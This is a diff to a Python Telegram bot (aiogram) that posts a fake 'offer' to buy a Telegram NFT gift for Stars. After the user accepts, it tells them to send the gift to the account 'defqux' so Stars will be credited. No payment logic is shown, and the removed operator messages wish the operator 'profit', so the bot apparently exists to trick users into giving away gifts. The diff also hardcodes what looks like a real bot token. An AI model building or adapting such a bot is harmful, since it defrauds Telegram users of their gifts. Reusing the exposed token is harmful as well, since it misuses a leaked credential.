@@ -7,16 +7,15 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"  # вставь свой токен
+BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"
 BUYER = "defqux"
 DEFAULT_STARS = 7000
-OFFER_DURATION_HOURS = 6  # сколько часов действует оффер
+OFFER_DURATION_HOURS = 6
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# chat_id -> expiry datetime
 offer_expiry = {}
 
 
@@ -56,7 +55,7 @@ async def on_msg(message: Message):
     text = message.text or ""
     gift = parse_gift(text)
     if not gift:
-        await message.answer("Заебал старый, кинь ссылку t.me/nft/... и цену сардельками своими напиши")
+        await message.answer("Кинь ссылку t.me/nft/... и цену")
         return
 
     expiry = datetime.utcnow() + timedelta(hours=OFFER_DURATION_HOURS)
@@ -74,7 +73,7 @@ async def on_msg(message: Message):
         InlineKeyboardButton(text="✓ Принять", callback_data=cb_data)
     ]])
 
-    await message.answer("Всё на мази? Проверяй, и делай, пиздатого профита лосяра.")
+    await message.answer("Готово. Перешли ниже.")
     await message.answer(offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)
 
 
@@ -102,7 +101,7 @@ async def on_acc(cb: CallbackQuery):
     )
     await cb.answer(alert_text, show_alert=True)
 
-   transfer_url = f"https://t.me/{BUYER}"
+    transfer_url = "tg://send_gift?to=defqux"
     success_text = (
         f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
         f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.\n\n"
@@ -121,7 +120,7 @@ async def on_acc(cb: CallbackQuery):
 
 
 async def main():
-    print("Alert + real timer bot started")
+    print("Bot started")
     await dp.start_polling(bot)
 
 
